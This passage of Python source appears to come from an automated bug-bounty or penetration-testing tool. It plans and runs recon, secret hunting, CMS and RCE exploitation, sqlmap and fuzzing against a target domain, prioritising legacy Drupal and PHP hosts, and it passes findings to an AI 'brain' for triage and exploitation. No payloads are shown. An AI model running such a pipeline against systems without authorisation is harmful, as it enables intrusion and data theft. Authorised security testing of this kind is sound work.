        known = state.setdefault("known_exposed_paths", {})
        for line in hits:
            urls = _extract_urls(line)
            if not urls:
                continue
            parsed = urlsplit(urls[0])
            if not parsed.path:
                continue
            hosts = set(known.get(parsed.path, []))
            hosts.add(_normalize_base_url(urls[0]))
            known[parsed.path] = sorted(h for h in hosts if h)
        _save_target_state(domain, state)
    return len(hits)


def _version_tuple(version: str) -> tuple[int, ...]:
    parts = []
    for chunk in str(version).split("."):
        if not chunk.isdigit():
            break
        parts.append(int(chunk))
    return tuple(parts)


def _is_vulnerable_drupal_version(version: str) -> bool:
    parts = _version_tuple(version)
    if not parts:
        return False
    if parts[0] == 7:
        return parts < (7, 58)
    if parts[0] == 8:
        return (
            parts < (8, 3, 9)
            or ((8, 4, 0) <= parts < (8, 4, 6))
            or ((8, 5, 0) <= parts < (8, 5, 1))
        )
    return False


def _recon_domain_root(domain: str) -> str:
    return os.path.join(RECON_DIR, domain)


def _findings_domain_root(domain: str) -> str:
    return os.path.join(FINDINGS_DIR, domain)


def _reports_domain_root(domain: str) -> str:
    return os.path.join(REPORTS_DIR, domain)


def _recon_sessions_root(domain: str) -> str:
    return os.path.join(_recon_domain_root(domain), "sessions")


def _findings_sessions_root(domain: str) -> str:
    return os.path.join(_findings_domain_root(domain), "sessions")


def _reports_sessions_root(domain: str) -> str:
    return os.path.join(_reports_domain_root(domain), "sessions")


def _recon_session_dir(domain: str, session_id: str) -> str:
    return os.path.join(_recon_sessions_root(domain), session_id)


def _findings_session_dir(domain: str, session_id: str) -> str:
    return os.path.join(_findings_sessions_root(domain), session_id)


def _reports_session_dir(domain: str, session_id: str) -> str:
    return os.path.join(_reports_sessions_root(domain), session_id)


def _recon_active_meta_path(domain: str) -> str:
    return os.path.join(_recon_domain_root(domain), "active_session.json")


def _recon_active_link(domain: str) -> str:
    return os.path.join(_recon_domain_root(domain), "active")


def _runtime_session_id(domain: str) -> str | None:
    return _RUNTIME_SESSION_IDS.get(domain)


def _remember_runtime_session(domain: str, session_id: str | None) -> None:
    _RUNTIME_SESSION_IDS[domain] = session_id


def _generate_session_id() -> str:
    return f"{datetime.now().strftime('%Y%m%d_%H%M%S')}_{os.urandom(2).hex()}"


def _legacy_recon_exists(domain: str) -> bool:
    domain_root = _recon_domain_root(domain)
    if not os.path.isdir(domain_root):
        return False
    for name in ("subdomains", "live", "ports", "urls", "js", "params", "priority", "api_specs"):
        if os.path.exists(os.path.join(domain_root, name)):
            return True
    return False


def _list_recon_sessions(domain: str) -> list[str]:
    sessions_root = _recon_sessions_root(domain)
    if not os.path.isdir(sessions_root):
        return []
    sessions = [
        name for name in os.listdir(sessions_root)
        if os.path.isdir(os.path.join(sessions_root, name))
    ]
    return sorted(sessions)


def _active_recon_session_id(domain: str) -> str | None:
    runtime_session_id = _runtime_session_id(domain)
    if runtime_session_id and os.path.isdir(_recon_session_dir(domain, runtime_session_id)):
        return runtime_session_id
    meta = _load_json(_recon_active_meta_path(domain), {})
    session_id = meta.get("session_id") if isinstance(meta, dict) else None
    if session_id and os.path.isdir(_recon_session_dir(domain, session_id)):
        return session_id
    sessions = _list_recon_sessions(domain)
    return sessions[-1] if sessions else None


def _set_active_recon_session(domain: str, session_id: str) -> str:
    domain_root = _recon_domain_root(domain)
    sessions_root = _recon_sessions_root(domain)
    session_dir = _recon_session_dir(domain, session_id)
    os.makedirs(sessions_root, exist_ok=True)
    os.makedirs(session_dir, exist_ok=True)

    active_link = _recon_active_link(domain)
    try:
        if os.path.lexists(active_link):
            os.unlink(active_link)
        rel_target = os.path.relpath(session_dir, domain_root)
        os.symlink(rel_target, active_link)
    except OSError:
        pass

    _write_json(_recon_active_meta_path(domain), {
        "target": domain,
        "session_id": session_id,
        "recon_dir": session_dir,
        "updated_at": datetime.now().isoformat(timespec="seconds"),
    })
    _remember_runtime_session(domain, session_id)
    return session_dir


def _activate_recon_session(
    domain: str,
    requested_session_id: str | None = None,
    create: bool = False,
) -> tuple[str | None, str]:
    if create:
        session_id = requested_session_id or _generate_session_id()
        session_dir = _set_active_recon_session(domain, session_id)
        return session_id, session_dir

    session_id = requested_session_id
    explicit_session = session_id not in (None, "", "latest")
    if session_id in (None, "", "latest"):
        session_id = _active_recon_session_id(domain)
    if session_id:
        session_dir = _recon_session_dir(domain, session_id)
        if os.path.isdir(session_dir):
            _remember_runtime_session(domain, session_id)
            return session_id, session_dir
    if explicit_session:
        return None, ""
    if _legacy_recon_exists(domain):
        _remember_runtime_session(domain, None)
        return None, _recon_domain_root(domain)
    return None, ""


def _resolve_recon_dir(domain: str, session_id: str | None = None) -> str:
    _, recon_dir = _activate_recon_session(domain, requested_session_id=session_id, create=False)
    return recon_dir or _recon_domain_root(domain)


def _resolve_findings_dir(domain: str, session_id: str | None = None, create: bool = False) -> str:
    active_session_id = session_id if session_id not in (None, "", "latest") else (_runtime_session_id(domain) or _active_recon_session_id(domain))
    if active_session_id:
        findings_dir = _findings_session_dir(domain, active_session_id)
    else:
        findings_dir = _findings_domain_root(domain)
    if create:
        os.makedirs(findings_dir, exist_ok=True)
    return findings_dir


def _resolve_reports_dir(domain: str, session_id: str | None = None, create: bool = False) -> str:
    active_session_id = session_id if session_id not in (None, "", "latest") else (_runtime_session_id(domain) or _active_recon_session_id(domain))
    if active_session_id:
        report_dir = _reports_session_dir(domain, active_session_id)
    else:
        report_dir = _reports_domain_root(domain)
    if create:
        os.makedirs(report_dir, exist_ok=True)
    return report_dir


def _autonomous_session_path(domain: str, session_id: str | None = None) -> str:
    if session_id:
        return os.path.join(TARGETS_DIR, domain, "sessions", session_id, "autonomous_session.json")
    return os.path.join(TARGETS_DIR, domain, "autonomous_session.json")


def _collect_completed_steps(domain: str, session_id: str | None = None) -> set[str]:
    recon_dir = _resolve_recon_dir(domain, session_id=session_id)
    findings_dir = _resolve_findings_dir(domain, session_id=session_id)
    completed = set()

    if _file_nonempty(os.path.join(recon_dir, "live", "httpx_full.txt")):
        completed.add("recon")
    if any(_file_nonempty(os.path.join(recon_dir, "js", name)) for name in (
        "endpoints.txt", "js_urls.txt", "jsluice_endpoints.txt",
    )):
        completed.add("js_analysis")
    if any(_file_nonempty(os.path.join(recon_dir, "secrets", name)) for name in (
        "trufflehog_recon.json", "githound.txt",
    )):
        completed.add("secret_hunt")
    if any(_file_nonempty(os.path.join(recon_dir, "params", name)) for name in (
        "arjun.json", "paramspider.txt",
    )):
        completed.add("param_discovery")
    if any(_file_nonempty(os.path.join(recon_dir, "api", name)) for name in (
        "kiterunner.txt", "feroxbuster.json",
    )):
        completed.add("api_fuzz")
    if _file_nonempty(os.path.join(recon_dir, "cors", "cors_findings.txt")):
        completed.add("cors")
    if any(_file_nonempty(os.path.join(findings_dir, name)) for name in (
        "summary.txt", "nuclei_findings.txt", "nuclei_full.txt",
    )):
        completed.add("scan")
    if _dir_has_files(os.path.join(findings_dir, "cms")):
        completed.add("cms_exploit")
    if _dir_has_files(os.path.join(findings_dir, "rce")):
        completed.add("rce_scan")
    if _dir_has_files(os.path.join(findings_dir, "sqlmap")):
        completed.add("sqlmap")
    if _dir_has_files(os.path.join(findings_dir, "jwt")):
        completed.add("jwt_audit")
    if _dir_has_files(os.path.join(findings_dir, "cves")):
        completed.add("cve_hunt")
    if _file_nonempty(os.path.join(findings_dir, "zero_day", "zero_day_findings.json")):
        completed.add("zero_day")
    return completed


def _load_autonomous_session(
    domain: str,
    quick: bool = False,
    allow_destructive: bool = False,
    max_steps: int = DEFAULT_AUTONOMOUS_STEPS,
    resume: bool = False,
    session_id: str | None = None,
) -> dict:
    session_file = _autonomous_session_path(domain, session_id=session_id)
    default = {
        "target": domain,
        "mode": "autonomous",
        "created_at": datetime.now().isoformat(timespec="seconds"),
        "updated_at": datetime.now().isoformat(timespec="seconds"),
        "quick": quick,
        "allow_destructive": allow_destructive,
        "max_steps": max_steps,
        "completed_steps": [],
        "attempted_steps": [],
        "last_plan": [],
        "signals": {},
        "last_result": {},
        "brain_next_action": "",
        "session_file": session_file,
        "resume": resume,
        "session_id": session_id,
    }
    session = _load_json(session_file, default) if resume else dict(default)
    if not isinstance(session, dict):
        session = default
    session.setdefault("target", domain)
    session.setdefault("mode", "autonomous")
    session.setdefault("created_at", default["created_at"])
    session.setdefault("completed_steps", [])
    session.setdefault("attempted_steps", [])
    session.setdefault("last_plan", [])
    session.setdefault("signals", {})
    session.setdefault("last_result", {})
    session.setdefault("brain_next_action", "")
    session.setdefault("session_id", session_id)
    session["quick"] = quick
    session["allow_destructive"] = allow_destructive
    session["max_steps"] = max_steps
    session["session_file"] = session_file
    session["resume"] = resume

    if resume:
        current_completed = sorted(
            set(session.get("completed_steps", []))
            | _collect_completed_steps(domain, session_id=session_id)
        )
    else:
        current_completed = []
        if _file_nonempty(os.path.join(_resolve_recon_dir(domain, session_id=session_id), "live", "httpx_full.txt")):
            current_completed.append("recon")
    session["completed_steps"] = current_completed
    return session


def _save_autonomous_session(session: dict) -> None:
    session["updated_at"] = datetime.now().isoformat(timespec="seconds")
    session_file = session.get("session_file") or _autonomous_session_path(
        session["target"],
        session_id=session.get("session_id"),
    )
    _write_json(session_file, session)


def _collect_autonomous_signals(domain: str) -> dict:
    recon_dir = _resolve_recon_dir(domain)
    findings_dir = _resolve_findings_dir(domain)
    target_state = _load_target_state(domain)
    attack_surface = _load_json(
        os.path.join(recon_dir, "priority", "attack_surface.json"),
        {},
    )
    tech_clusters = [
        item.get("tech", "")
        for item in attack_surface.get("tech_clusters", [])
        if item.get("tech")
    ]
    checks = [
        item.get("check", "")
        for item in attack_surface.get("priority_recommendations", [])
        if item.get("check")
    ]
    version_hints = [
        item.get("version", "")
        for item in attack_surface.get("detected_versions", [])
        if item.get("version")
    ]

    signals = {
        "recon_exists": _file_nonempty(os.path.join(recon_dir, "live", "httpx_full.txt")),
        "live_hosts": _line_count(os.path.join(recon_dir, "live", "urls.txt")),
        "critical_hosts": _line_count(os.path.join(recon_dir, "priority", "critical_hosts.txt")),
        "high_hosts": _line_count(os.path.join(recon_dir, "priority", "high_hosts.txt")),
        "parameterized_urls": _line_count(os.path.join(recon_dir, "urls", "with_params.txt")),
        "api_endpoints": _line_count(os.path.join(recon_dir, "urls", "api_endpoints.txt")),
        "openapi_specs": _line_count(os.path.join(recon_dir, "api_specs", "spec_urls.txt")),
        "openapi_public_ops": _line_count(os.path.join(recon_dir, "api_specs", "public_operations.txt")),
        "openapi_unauth_findings": _line_count(os.path.join(recon_dir, "api_specs", "unauth_api_findings.txt")),
        "graphql_endpoints": _line_count(os.path.join(recon_dir, "urls", "graphql.txt")),
        "js_files": _line_count(os.path.join(recon_dir, "urls", "js_files.txt")),
        "status_401": _line_count(os.path.join(recon_dir, "live", "status_401.txt")),
        "status_403": _line_count(os.path.join(recon_dir, "live", "status_403.txt")),
        "status_429": _line_count(os.path.join(recon_dir, "live", "status_429.txt")),
        "idor_candidates": _line_count(os.path.join(findings_dir, "idor", "idor_candidates.txt")),
        "api_sequential_ids": _line_count(os.path.join(findings_dir, "idor", "api_sequential_ids.txt")),
        "unauth_api_hits": _line_count(os.path.join(findings_dir, "auth_bypass", "unauth_api_access.txt")),
        "bypass_hits": _line_count(os.path.join(findings_dir, "auth_bypass", "403_bypass_hits.txt")),
        "sqli_hits": (
            _line_count(os.path.join(findings_dir, "sqli", "nuclei_sqli.txt")) +
            _line_count(os.path.join(findings_dir, "sqlmap", "sqlmap_results.txt")) +
            _line_count(os.path.join(findings_dir, "sqli", "sqlmap_confirmed.txt"))
        ),
        "verified_sensitive": (
            _line_count(os.path.join(findings_dir, "exposure", "verified_sensitive.txt")) +
            _line_count(os.path.join(recon_dir, "exposure", "config_files.txt"))
        ),
        "propagated_exposure_hits": _line_count(os.path.join(findings_dir, "exposure", "propagated_config_hits.txt")),
        "upload_candidates": _line_count(os.path.join(findings_dir, "upload", "upload_candidates.tsv")),
        "confirmed_cves": _line_count(os.path.join(findings_dir, "cves", "nuclei_cve_confirmed.txt")),
        "tech_clusters": tech_clusters,
        "priority_checks": checks,
        "version_hints": version_hints,
        "known_waf_hosts": len(target_state.get("waf_hosts", [])),
        "known_report_hashes": len(target_state.get("reported_finding_hashes", [])),
        "known_exposed_paths": len(target_state.get("known_exposed_paths", {})),
    }

    for version_hint in version_hints:
        lower = version_hint.lower()
        if lower.startswith("drupal "):
            tech_clusters.append("drupal")
        elif lower.startswith("php "):
            tech_clusters.append("php")

    tech_set = {tech.lower() for tech in tech_clusters}
    signals["ai_surface"] = sorted(tech_set & AUTONOMOUS_AI_TECHS)
    signals["cms_surface"] = sorted(tech_set & AUTONOMOUS_CMS_TECHS)
    signals["rce_surface"] = sorted(tech_set & AUTONOMOUS_RCE_TECHS)
    legacy_drupal_versions = []
    legacy_php_versions = []
    for version_hint in version_hints:
        lower = version_hint.lower()
        if lower.startswith("drupal "):
            version = lower.split(" ", 1)[1].strip()
            parts = _version_tuple(version)
            if parts and parts[0] == 7 and parts < (7, 58):
                legacy_drupal_versions.append(version)
        elif lower.startswith("php "):
            version = lower.split(" ", 1)[1].strip()
            parts = _version_tuple(version)
            if parts and parts < (7, 0):
                legacy_php_versions.append(version)
    signals["legacy_drupal_versions"] = sorted(set(legacy_drupal_versions))
    signals["legacy_php_versions"] = sorted(set(legacy_php_versions))
    signals["auth_surface"] = (
        signals["status_401"] > 0
        or signals["status_403"] > 0
        or signals["unauth_api_hits"] > 0
        or signals["bypass_hits"] > 0
        or bool(tech_set & AUTONOMOUS_AUTH_TECHS)
    )
    return signals


def _log_best_validation_targets(recon_dir: str, limit: int = 10) -> None:
    attack_surface = _load_json(os.path.join(recon_dir, "priority", "attack_surface.json"), {})
    targets = attack_surface.get("validation_targets", []) or []
    if not targets:
        return
    log("info", "Best validation targets:")
    for item in targets[:limit]:
        url = item.get("url", "").strip()
        if not url:
            continue
        priority = item.get("priority", "MEDIUM")
        confidence = item.get("confidence", "banner")
        detail = ""
        versions = item.get("version_hints", []) or []
        evidence = item.get("evidence_hints", []) or []
        if versions:
            detail = ", ".join(versions[:2])
        elif evidence:
            detail = ", ".join(ev.replace("evidence:", "") for ev in evidence[:2])
        else:
            cves = item.get("cves", []) or []
            if cves:
                detail = cves[0]
        suffix = f" :: {detail}" if detail else ""
        log("info", f"  - {url} [{priority.lower()}/{confidence}]{suffix}")


def _build_autonomous_plan(
    domain: str,
    quick: bool = False,
    allow_destructive: bool = False,
    max_steps: int = DEFAULT_AUTONOMOUS_STEPS,
    completed_steps: set[str] | None = None,
) -> tuple[dict, list[dict]]:
    completed_steps = completed_steps or set()
    signals = _collect_autonomous_signals(domain)
    plan = []
    planned_steps = set()

    def add(step: str, reason: str, destructive: bool = False) -> None:
        if step in completed_steps or step in planned_steps:
            return
        if destructive and not allow_destructive:
            return
        priority = AUTONOMOUS_STEP_BASE_PRIORITY.get(step, 10)
        if signals["critical_hosts"] > 0 and step in {"cve_hunt", "rce_scan", "cms_exploit", "api_fuzz", "scan"}:
            priority += 20
        if signals["legacy_drupal_versions"] and step in {"cms_exploit", "cve_hunt"}:
            priority += 30
        if signals["legacy_php_versions"] and step in {"cve_hunt", "scan"}:
            priority += 12
        if signals["openapi_unauth_findings"] > 0 and step in {"api_fuzz", "scan"}:
            priority += 18
        if signals["idor_candidates"] > 0 and step in {"api_fuzz", "scan"}:
            priority += 24
        if signals["api_sequential_ids"] > 0 and step == "api_fuzz":
            priority += 16
        if signals["unauth_api_hits"] > 0 and step in {"api_fuzz", "scan"}:
            priority += 22
        if signals["bypass_hits"] > 0 and step in {"scan", "cors", "jwt_audit"}:
            priority += 10
        if signals["sqli_hits"] > 0 and step == "sqlmap":
            priority += 30
        if signals["verified_sensitive"] > 0 and step in {"scan", "cve_hunt"}:
            priority += 10
        if signals["propagated_exposure_hits"] > 0 and step in {"scan", "cve_hunt"}:
            priority += 18
        if signals["upload_candidates"] > 0 and step == "scan":
            priority += 12
        if signals["confirmed_cves"] > 0 and step == "cve_hunt":
            priority += 14
        if signals["rce_surface"] and step == "rce_scan":
            priority += 18
        if signals["cms_surface"] and step == "cms_exploit":
            priority += 16
        if signals["parameterized_urls"] > 0 and step == "sqlmap":
            priority += 10
        if signals["high_hosts"] > 0 and step == "cve_hunt":
            priority += 8
        plan.append({
            "step": step,
            "reason": reason,
            "destructive": destructive,
            "priority": priority,
        })
        planned_steps.add(step)

    if not signals["recon_exists"]:
        add("recon", "No recon data exists yet, so autonomy starts by building the target map.")
        return signals, plan[:1]

    add("scan", "Run the core vulnerability scan against the prioritized attack surface.")

    if signals["js_files"] > 0 or signals["ai_surface"]:
        add("js_analysis", f"Client-side or agent UI surface detected ({signals['js_files']} JS files).")
        add("secret_hunt", "Automation platforms and frontends often leak tokens, keys, or webhook secrets.")

    if signals["parameterized_urls"] > 0:
        add("param_discovery", f"{signals['parameterized_urls']} parameterized URLs were already observed.")

    if signals["idor_candidates"] > 0:
        add("api_fuzz", f"IDOR candidates already surfaced ({signals['idor_candidates']}) — expand sibling resource testing.")
    elif signals["unauth_api_hits"] > 0:
        add("api_fuzz", f"Confirmed unauthenticated API responses ({signals['unauth_api_hits']}) — propagate across sibling endpoints.")
    elif signals["openapi_unauth_findings"] > 0:
        add("api_fuzz", f"OpenAPI audit already found {signals['openapi_unauth_findings']} unauthenticated responses worth drilling into.")
    elif signals["openapi_specs"] > 0:
        add("api_fuzz", f"Discovered {signals['openapi_specs']} OpenAPI / Swagger specs with {signals['openapi_public_ops']} public operations.")
    elif signals["api_endpoints"] > 0 or signals["graphql_endpoints"] > 0 or signals["ai_surface"]:
        add("api_fuzz", "API, GraphQL, or agent execution endpoints were discovered.")

    if signals["auth_surface"]:
        add("cors", "Protected endpoints and auth gates are good CORS and proxy-bypass candidates.")
        add("jwt_audit", "The recon surface suggests tokens or auth workflows worth auditing.")

    if (
        signals["critical_hosts"] > 0
        or signals["high_hosts"] > 0
        or signals["ai_surface"]
        or signals["legacy_drupal_versions"]
        or signals["legacy_php_versions"]
    ):
        cve_reason = "The tech stack includes high-risk or AI-platform components worth CVE correlation."
        if signals["legacy_drupal_versions"]:
            cve_reason = (
                f"Legacy Drupal detected ({', '.join(signals['legacy_drupal_versions'])}) "
                "— validate CMS RCE paths and historical CVEs first."
            )
        elif signals["legacy_php_versions"]:
            cve_reason = (
                f"Legacy PHP detected ({', '.join(signals['legacy_php_versions'])}) "
                "— prioritize legacy stack CVE review before low-yield checks."
            )
        add("cve_hunt", cve_reason)

    if signals["cms_surface"] or signals["legacy_drupal_versions"]:
        cms_reason = f"CMS stack detected: {', '.join(signals['cms_surface'])}."
        if signals["legacy_drupal_versions"]:
            cms_reason = (
                f"Legacy Drupal detected ({', '.join(signals['legacy_drupal_versions'])}) "
                "— run Drupal exploit validation before generic web checks."
            )
        add("cms_exploit", cms_reason, destructive=True)

    if signals["rce_surface"]:
        add("rce_scan", f"RCE-prone stack detected: {', '.join(signals['rce_surface'])}.", destructive=True)

    if signals["sqli_hits"] > 0:
        add("sqlmap", f"SQLi signals already fired ({signals['sqli_hits']}) — deepen sqlmap on sibling parameters.", destructive=True)
    elif signals["parameterized_urls"] > 0:
        add("sqlmap", "Parameterized endpoints are available for confirmatory SQLi testing.", destructive=True)

    if not quick and (signals["critical_hosts"] > 0 or signals["ai_surface"]):
        add("zero_day", "Deeper custom fuzzing is reserved for opted-in autonomous runs.", destructive=True)

    plan.sort(key=lambda item: (-item.get("priority", 0), item["step"]))
    return signals, plan[:max(1, max_steps)]


def _render_autonomous_summary(domain: str, signals: dict, plan: list[dict]) -> str:
    techs = ", ".join(signals.get("tech_clusters", [])[:8]) or "none"
    versions = ", ".join(signals.get("version_hints", [])[:8]) or "none"
    ai_surface = ", ".join(signals.get("ai_surface", [])) or "none"
    checks = "; ".join(signals.get("priority_checks", [])[:6]) or "none"
    plan_lines = [
        f"- {item['step']} (p={item.get('priority', 0)}): {item['reason']}"
        for item in plan
    ] or ["- none"]
    return (
        f"Target: {domain}\n"
        f"Live hosts: {signals.get('live_hosts', 0)}\n"
        f"Critical hosts: {signals.get('critical_hosts', 0)}\n"
        f"High hosts: {signals.get('high_hosts', 0)}\n"
        f"Parameterized URLs: {signals.get('parameterized_urls', 0)}\n"
        f"API endpoints: {signals.get('api_endpoints', 0)}\n"
        f"OpenAPI specs: {signals.get('openapi_specs', 0)} | Public ops: {signals.get('openapi_public_ops', 0)} | Unauth findings: {signals.get('openapi_unauth_findings', 0)}\n"
        f"GraphQL endpoints: {signals.get('graphql_endpoints', 0)}\n"
        f"JS files: {signals.get('js_files', 0)}\n"
        f"401s: {signals.get('status_401', 0)} | 403s: {signals.get('status_403', 0)} | 429s: {signals.get('status_429', 0)}\n"
        f"IDOR candidates: {signals.get('idor_candidates', 0)} | Unauth API hits: {signals.get('unauth_api_hits', 0)} | SQLi hits: {signals.get('sqli_hits', 0)}\n"
        f"Verified sensitive paths: {signals.get('verified_sensitive', 0)} | Propagated exposure hits: {signals.get('propagated_exposure_hits', 0)}\n"
        f"Tech clusters: {techs}\n"
        f"Version hints: {versions}\n"
        f"AI / agent surface: {ai_surface}\n"
        f"Priority checks: {checks}\n"
        "Planned steps:\n" + "\n".join(plan_lines)
    )


def _run_autonomous_step(
    domain: str,
    step: str,
    *,
    quick: bool,
    full: bool,
    batch_size: int,
    skip_items: set[str],
    result: dict,
    completed: set[str],
) -> bool:
    """Execute one autonomous step in the chosen priority order."""
    del batch_size  # reserved for future step-specific tuning

    if step == "scan":
        ok = run_vuln_scan(domain, quick=quick, skip_items=skip_items, full=full)
        result["scan"] = ok
    elif step == "js_analysis":
        ok = run_js_analysis(domain)
        result["js_analysis"] = ok
    elif step == "secret_hunt":
        ok = run_secret_hunt(domain)
        result["secret_hunt"] = ok
    elif step == "param_discovery":
        ok = run_param_discovery(domain)
        result["param_discovery"] = ok
    elif step == "api_fuzz":
        ok = False if quick else run_api_fuzz(domain)
        result["api_fuzz"] = ok
    elif step == "cors":
        ok = run_cors_check(domain)
        result["cors"] = ok
    elif step == "cms_exploit":
        ok = run_cms_exploit(domain)
        result["cms_exploit"] = ok
    elif step == "rce_scan":
        ok = run_rce_scan(domain)
        result["rce_scan"] = ok
    elif step == "sqlmap":
        ok = run_sqlmap_targeted(domain)
        result["sqlmap"] = ok
    elif step == "jwt_audit":
        ok = run_jwt_audit(domain)
        result["jwt_audit"] = ok
    elif step == "cve_hunt":
        ok = run_cve_hunt(domain)
    elif step == "zero_day":
        log("warn", "Zero-day fuzzer — results require manual verification")
        ok = run_fuzzer(domain, deep=not quick)
    else:
        log("warn", f"Autonomous step not implemented: {step}")
        return False

    if ok:
        completed.add(step)
    result["success"] = result.get("success", True) and ok
    return ok


def run_autonomous_hunt(
    domain: str,
    quick: bool = False,
    full: bool = False,
    resume: bool = False,
    resume_session_id: str | None = None,
    batch_size: int = 10,
    max_steps: int = DEFAULT_AUTONOMOUS_STEPS,
    allow_destructive: bool = False,
    skip_items: set[str] | None = None,
    time_left_hours: float = 2.0,
    scope_lock: bool = False,
    max_urls: int = 100,
) -> dict:
    skip_items = skip_items or set()
    if resume:
        session_id, recon_dir = _activate_recon_session(
            domain,
            requested_session_id=resume_session_id or "latest",
            create=False,
        )
        if not recon_dir:
            log("err", f"No recon session found for {domain} to resume")
            return {
                "domain": domain,
                "success": False,
                "autonomous": True,
                "reports": 0,
            }
        log("info", f"Resuming recon session: {session_id or 'legacy'} → {recon_dir}")
    else:
        session_id, recon_dir = _activate_recon_session(domain, create=True)
        log("info", f"Recon session: {session_id} → {recon_dir}")
    session = _load_autonomous_session(
        domain,
        quick=quick,
        allow_destructive=allow_destructive,
        max_steps=max_steps,
        resume=resume,
        session_id=session_id,
    )
    if not resume and os.path.isfile(session["session_file"]):
        log("info", "Fresh autonomous run: ignoring prior session progress (use --resume to reuse completed steps)")
    result = {
        "domain": domain,
        "success": True,
        "autonomous": True,
        "autonomous_session": session["session_file"],
        "session_id": session_id,
        "recon_dir": recon_dir,
        "findings_dir": _resolve_findings_dir(domain, session_id=session_id, create=True),
        "report_dir": _resolve_reports_dir(domain, session_id=session_id, create=True),
        "reports": 0,
    }

    completed = set(session.get("completed_steps", []))
    attempted = set(session.get("attempted_steps", []))
    for step, key in (
        ("recon", "recon"),
        ("scan", "scan"),
        ("js_analysis", "js_analysis"),
        ("secret_hunt", "secret_hunt"),
        ("param_discovery", "param_discovery"),
        ("api_fuzz", "api_fuzz"),
        ("cors", "cors"),
        ("cms_exploit", "cms_exploit"),
        ("rce_scan", "rce_scan"),
        ("sqlmap", "sqlmap"),
        ("jwt_audit", "jwt_audit"),
    ):
        result[key] = step in completed

    if "recon" not in completed and skip_has(skip_items, "recon"):
        log("warn", f"Skipping recon for {domain} (--skip recon)")
    elif "recon" not in completed:
        log("phase", f"AUTONOMOUS RECON: {domain}")
        recon_ok = run_recon(
            domain,
            quick=quick,
            batch_size=batch_size,
            resume=resume,
            session_id=session_id,
            scope_lock=scope_lock,
            max_urls=max_urls,
        )
        result["recon"] = recon_ok
        result["success"] = result["success"] and recon_ok
        if recon_ok:
            completed.add("recon")
        findings_dir = _resolve_findings_dir(domain, session_id=session_id, create=True)
        if _brain and _brain.enabled and os.path.isdir(recon_dir):
            log("info", "Brain: autonomous post-recon hook...")
            _brain.post_recon_hook(recon_dir, findings_dir)
        session["completed_steps"] = sorted(completed)
        _save_autonomous_session(session)

    recon_dir = _resolve_recon_dir(domain, session_id=session_id)
    recon_httpx = os.path.join(recon_dir, "live", "httpx_full.txt")
    if _file_nonempty(recon_httpx):
        log("info", "Refreshing tech-CVE prioritization from latest recon artifacts...")
        run_prioritize(domain)

    executable_steps = {
        "scan", "js_analysis", "secret_hunt", "param_discovery",
        "api_fuzz", "cors", "cms_exploit", "rce_scan",
        "sqlmap", "jwt_audit", "cve_hunt", "zero_day",
    }
    plan_logged = False
    last_logged_plan: list[str] = []
    executed_steps: list[str] = []
    plan: list[dict] = []
    signals: dict = {}

    for _ in range(max(1, max_steps)):
        planning_completed = completed | attempted
        signals, plan = _build_autonomous_plan(
            domain,
            quick=quick,
            allow_destructive=allow_destructive,
            max_steps=max_steps,
            completed_steps=planning_completed,
        )
        if skip_items:
            planned_before = len(plan)
            plan = [item for item in plan if not skip_has(skip_items, item["step"])]
            skipped_planned = planned_before - len(plan)
            if skipped_planned:
                log("info", f"Autonomous planner removed {skipped_planned} skipped step(s) from the plan")

        session["signals"] = signals
        session["last_plan"] = plan
        result["autonomous_plan"] = [item["step"] for item in plan]
        current_plan_steps = [item["step"] for item in plan]

        if not plan_logged:
            if plan:
                log("info", "Autonomous plan:")
                for item in plan:
                    danger = " [destructive]" if item.get("destructive") else ""
                    log("info", f"  - {item['step']}{danger}: {item['reason']}")
                _log_best_validation_targets(recon_dir, limit=10)
            else:
                log("info", "Autonomous planner found no unfinished steps worth running.")
            plan_logged = True
            last_logged_plan = current_plan_steps
        elif current_plan_steps != last_logged_plan:
            log("info", "Autonomous plan updated from fresh findings:")
            for item in plan[:6]:
                danger = " [destructive]" if item.get("destructive") else ""
                log("info", f"  - {item['step']}{danger}: {item['reason']}")
            last_logged_plan = current_plan_steps

        next_item = next((item for item in plan if item["step"] in executable_steps), None)
        if not next_item:
            break

        step = next_item["step"]
        attempted.add(step)
        executed_steps.append(step)
        danger = " [destructive]" if next_item.get("destructive") else ""
        log("phase", f"AUTONOMOUS STEP: {step}{danger}")
        log("info", f"Reason: {next_item['reason']}")
        _run_autonomous_step(
            domain,
            step,
            quick=quick,
            full=full,
            batch_size=batch_size,
            skip_items=skip_items,
            result=result,
            completed=completed,
        )
        _update_target_state_from_artifacts(domain, session_id=session_id)
        if resume:
            session["completed_steps"] = sorted(completed | _collect_completed_steps(domain, session_id=session_id))
        else:
            session["completed_steps"] = sorted(completed)
        session["attempted_steps"] = sorted(attempted)
        session["last_result"] = result
        _save_autonomous_session(session)

    if executed_steps:
        findings_dir = _resolve_findings_dir(domain, session_id=session_id, create=True)
        if _brain and _brain.enabled and os.path.isdir(findings_dir):
            log("info", "Brain: autonomous post-scan hook (triage + exploit + report)...")
            _brain.post_scan_hook(findings_dir, recon_dir)
        if not skip_has(skip_items, "reports"):
            result["reports"] = generate_reports(domain)

    if resume:
        session["completed_steps"] = sorted(completed | _collect_completed_steps(domain, session_id=session_id))
    else:
        session["completed_steps"] = sorted(completed)
    session["attempted_steps"] = sorted(attempted)
    session["last_result"] = result

    if _brain and _brain.enabled and plan:
        summary = _render_autonomous_summary(domain, signals, plan)
        brain_next = _brain.next_action("autonomous", summary, time_left_hours)
        session["brain_next_action"] = brain_next

    _save_autonomous_session(session)
    result["autonomous_session"] = session["session_file"]
    result["autonomous_plan"] = [item["step"] for item in plan]
    return result


# ── Wordlist setup ─────────────────────────────────────────────────────────────
def setup_wordlists() -> None:
    os.makedirs(WORDLIST_DIR, exist_ok=True)
    wordlists = {
        # ── Directory discovery ─────────────────────────────────────────────
        "common.txt":               "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/common.txt",
        "raft-medium-dirs.txt":     "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/raft-medium-directories.txt",
        "api-endpoints.txt":        "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-endpoints.txt",
        "api-words.txt":            "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/api/api-seen-in-wild.txt",
        "params.txt":               "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/Web-Content/burp-parameter-names.txt",
        "subdomains-top1m.txt":     "https://raw.githubusercontent.com/danielmiessler/SecLists/master/Discovery/DNS/subdomains-top1million-5000.txt",
        # ── Vulnerability payloads — SecLists (fallback) ───────────────────
